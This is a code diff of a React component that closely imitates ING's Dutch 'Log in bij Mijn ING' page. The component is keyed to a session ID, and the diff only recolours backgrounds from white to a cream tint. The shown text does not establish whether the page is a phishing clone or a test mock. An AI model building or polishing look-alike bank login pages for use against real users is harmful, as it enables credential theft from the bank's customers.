@@ -45,7 +45,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
       </div>
 
       {/* Top Bar */}
-      <header className="bg-white h-[70px] flex items-center justify-between px-8 border-b border-gray-200 z-10 relative">
+      <header className="bg-[#fff6ec] h-[70px] flex items-center justify-between px-8 border-b border-gray-200 z-10 relative">
         <img src="/bank-logos/ing-detail.svg" alt="ING" className="h-10" />
         <div className="flex items-center gap-6 text-[14px] text-[#000066] font-bold">
           <button className="flex items-center gap-2 hover:underline">
@@ -64,7 +64,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
       <main className="flex-1 flex flex-col items-center pt-12 px-4 z-10 relative">
         
         {/* Tabs */}
-        <div className="w-full max-w-[440px] flex items-center bg-white border-b border-gray-200 rounded-t-sm shadow-sm">
+        <div className="w-full max-w-[440px] flex items-center bg-[#fff6ec] border-b border-gray-200 rounded-t-sm shadow-sm">
           <button className="px-6 py-4 text-[15px] font-bold text-[#333] border-b-4 border-[#FF6200]">
             Particulier
           </button>
@@ -74,7 +74,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
         </div>
 
         {/* Login Card */}
-        <div className="bg-white w-full max-w-[440px] shadow-sm rounded-b-sm border border-t-0 border-gray-200 p-8">
+        <div className="bg-[#fff6ec] w-full max-w-[440px] shadow-sm rounded-b-sm border border-t-0 border-gray-200 p-8">
           <h1 className="text-[24px] font-bold text-[#FF6200] mb-6">Log in bij Mijn ING</h1>
           
           <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
@@ -136,7 +136,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
         </div>
 
         {/* Secondary Card */}
-        <div className="bg-white w-full max-w-[440px] shadow-sm rounded-sm border border-gray-200 mt-6 p-6 flex flex-col cursor-pointer hover:shadow-md transition-shadow">
+        <div className="bg-[#fff6ec] w-full max-w-[440px] shadow-sm rounded-sm border border-gray-200 mt-6 p-6 flex flex-col cursor-pointer hover:shadow-md transition-shadow">
           <h2 className="text-[#FF6200] font-bold text-[16px] mb-4">Inloggen kan ook zo</h2>
           <div className="flex items-center justify-between">
             <div className="flex items-center gap-4">
